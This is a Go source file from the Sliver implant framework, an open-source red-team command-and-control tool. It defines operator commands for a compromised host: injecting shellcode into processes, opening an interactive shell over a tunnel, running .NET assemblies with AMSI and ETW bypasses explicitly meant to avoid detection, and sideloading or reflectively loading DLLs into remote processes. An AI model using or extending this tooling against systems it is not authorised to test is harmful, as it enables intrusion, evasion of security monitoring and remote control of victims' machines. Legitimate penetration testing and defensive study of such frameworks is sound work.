package commands

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"strings"

	"github.com/bishopfox/sliver/client/constants"
	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/ssh/terminal"
)

// ExecuteShellcode - Executes the given shellcode in the sliver process
type ExecuteShellcode struct {
	Positional struct {
		Path string `description:"path to shellcode to inject" required:"1-1"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		RWX         bool   `long:"rwx" short:"r" description:"use RWX permissions for memory pages"`
		PID         uint32 `long:"pid" short:"p" description:"PID of process to inject into (0 means injection into ourselves)"`
		RemotePath  string `long:"process" short:"n" description:"path to process to inject into when running in interactive mode" default:"c:\\windows\\system32\\notepad.exe"`
		Interactive bool   `long:"interactive" short:"i" description:"inject into a new process and interact with it"`
	} `group:"shellcode options"`
}

// Execute - Executes the given shellcode in the sliver process
func (es *ExecuteShellcode) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	interactive := es.Options.Interactive
	pid := es.Options.PID
	shellcodePath := es.Positional.Path
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(util.Error+"Error: %s\n", err.Error())
		return
	}
	if pid != 0 && interactive {
		fmt.Printf(util.Error + "Cannot use both `--pid` and `--interactive`\n")
		return
	}
	if interactive {
		es.executeInteractive(es.Options.RemotePath, shellcodeBin, es.Options.RWX)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	task, err := transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: es.Options.RWX,
		Pid:      uint32(pid),
		Request:  ContextRequest(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	if task.Response.GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", task.Response.GetErr())
		return
	}
	fmt.Printf(util.Info + "Executed shellcode on target\n")

	return
}

func (es *ExecuteShellcode) executeInteractive(hostProc string, shellcode []byte, rwxPages bool) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	// Use the client logger for controlling log output
	clog := log.ClientLogger

	// Start remote process and tunnel
	noPty := false
	if session.GetOS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := transport.RPC.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}

	tunnel := transport.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	shell, err := transport.RPC.Shell(context.Background(), &sliverpb.ShellReq{
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
		Request:   ContextRequest(session),
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	_, err = transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
		Request:  ContextRequest(session),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	clog.Debugf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	fmt.Printf(util.Info+"Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		clog.Tracef("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(util.Error + "Failed to save terminal state")
			return
		}
	}

	clog.Debugf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		clog.Tracef("Wrote %d bytes to stdout", n)
		if err != nil {
			fmt.Printf(util.Error+"Error writing to stdout: %v", err)
			return
		}
	}()
	for {
		clog.Debugf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		clog.Tracef("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf(util.Error+"Error reading from stdin: %v", err)
			break
		}
	}

	if !noPty {
		clog.Debugf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	clog.Debugf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()

}

// ExecuteAssembly - Loads and executes a .NET assembly in a child process (Windows Only)
type ExecuteAssembly struct {
	Positional struct {
		Path string   `description:"path to assembly bytes" required:"1-1"`
		Args []string `description:"(optional) arguments to pass to assembly when executing"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		AMSI       bool   `long:"amsi" short:"a" description:"use AMSI bypass (disabled by default)"`
		ETW        bool   `long:"etw" short:"e" description:"patch EtwEventWrite function to avoid detection (disabled by default)"`
		RemotePath string `long:"process" short:"p" description:"hosting process to inject into" default:"c:\\windows\\system32\\notepad.exe"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
	} `group:"assembly options"`
}

// Execute - Loads and executes a .NET assembly in a child process (Windows Only)
func (ea *ExecuteAssembly) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	assemblyBytes, err := ioutil.ReadFile(ea.Positional.Path)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}

	assemblyArgs := ""
	if len(ea.Positional.Args) == 1 {
		assemblyArgs = ea.Positional.Args[1]
	} else if len(ea.Positional.Args) < 2 {
		assemblyArgs = " "
	}
	process := ea.Options.RemotePath

	ctrl := make(chan bool)
	go spin.Until("Executing assembly ...", ctrl)
	executeAssembly, err := transport.RPC.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		AmsiBypass: ea.Options.AMSI,
		Process:    process,
		Arguments:  assemblyArgs,
		Assembly:   assemblyBytes,
		EtwBypass:  ea.Options.ETW,
		Request:    ContextRequest(session),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	if executeAssembly.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", executeAssembly.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if ea.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.ExecuteAssemblyStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Assembly output:\n%s", string(executeAssembly.GetOutput()))
	if outFilePath != nil {
		outFilePath.Write(executeAssembly.GetOutput())
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}
	return
}

// Sideload - Load and execute a shared object (shared library/DLL) in a remote process
type Sideload struct {
	Positional struct {
		LocalPath string   `description:"path to shared object" required:"1-1"`
		Args      []string `description:"(optional) arguments for the shared library function"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Entrypoint string `long:"entry-point" short:"e" description:"entrypoint for the DLL (Windows only)"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the shellcode"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
	} `group:"sideload options"`
}

// Execute - Load and execute a shared object (shared library/DLL) in a remote process
func (s *Sideload) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	binPath := s.Positional.LocalPath

	entryPoint := s.Options.Entrypoint
	processName := s.Options.RemotePath
	cargs := strings.Join(s.Positional.Args, " ")

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	sideload, err := transport.RPC.Sideload(context.Background(), &sliverpb.SideloadReq{
		Args:        cargs,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Request:     ContextRequest(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	if sideload.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", sideload.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SideloadStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Output:\n%s", sideload.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideload.GetResult()))
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}

	return
}

// SpawnDLL - Load and execute a Reflective DLL in a remote process
type SpawnDLL struct {
	Positional struct {
		Path string   `description:"path to reflective DLL" required:"1-1"`
		Args []string `description:"(optional) arguments to be passed when executing the DLL"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Export     string `long:"export" short:"e" description:"entrypoint of the reflective DLL" default:"ReflectiveLoader"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the DLL" default:"c:\\windows\\system32\\notepad.exe"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
	} `group:"dll options"`
}

// Execute - Load and execute a Reflective DLL in a remote process
func (s *SpawnDLL) Execute(cargs []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	var args = strings.Join(s.Positional.Args, " ")

	binPath := s.Positional.Path
	processName := s.Options.RemotePath
	exportName := s.Options.Export

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Executing reflective dll %s", binPath), ctrl)
	spawndll, err := transport.RPC.SpawnDll(context.Background(), &sliverpb.InvokeSpawnDllReq{
		Data:        binData,
		ProcessName: processName,
		Args:        args,
		EntryPoint:  exportName,
		Request:     ContextRequest(session),
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}
	ctrl <- true
	<-ctrl
	if spawndll.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", spawndll.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SpawnDllStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Output:\n%s", spawndll.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(spawndll.GetResult()))
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}

	return
}
